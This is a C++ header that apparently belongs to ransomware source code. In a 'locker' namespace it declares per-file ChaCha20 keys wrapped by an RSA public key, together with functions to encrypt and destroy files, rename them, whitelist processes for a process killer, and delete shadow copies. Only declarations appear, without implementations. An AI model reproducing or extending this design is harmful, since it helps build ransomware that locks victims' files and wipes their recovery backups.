#pragma once
#include "common.h"
#include "chacha20/ecrypt-sync.h"
#include "queue.h"
#include "process_killer.h"

namespace locker {

	typedef struct file_info {

		LPCWSTR Filename;
		HANDLE FileHandle;
		LONGLONG FileSize;
		ECRYPT_ctx CryptCtx;
		BYTE ChachaIV[8];
		BYTE ChachaKey[32];
		BYTE EncryptedKey[524];

	} FILE_INFO, * LPFILE_INFO;

	typedef TAILQ_HEAD(file_list, file_info) FILE_LIST, * PFILE_LIST;

	BOOL Encrypt(
		__in LPFILE_INFO FileInfo,
		__in LPBYTE Buffer,
		__in HCRYPTPROV CryptoProvider,
		__in HCRYPTKEY PublicKey
	);

	BOOL Destroy(
		__in LPFILE_INFO FileInfo,
		__in LPBYTE Buffer
	);

	BOOL ChangeFileName(__in LPCWSTR OldName);
	VOID CloseFile(__in locker::LPFILE_INFO FileInfo);
	VOID SetWhiteListProcess(process_killer::PPID_LIST PidList);
	BOOL DeleteShadowCopies();

};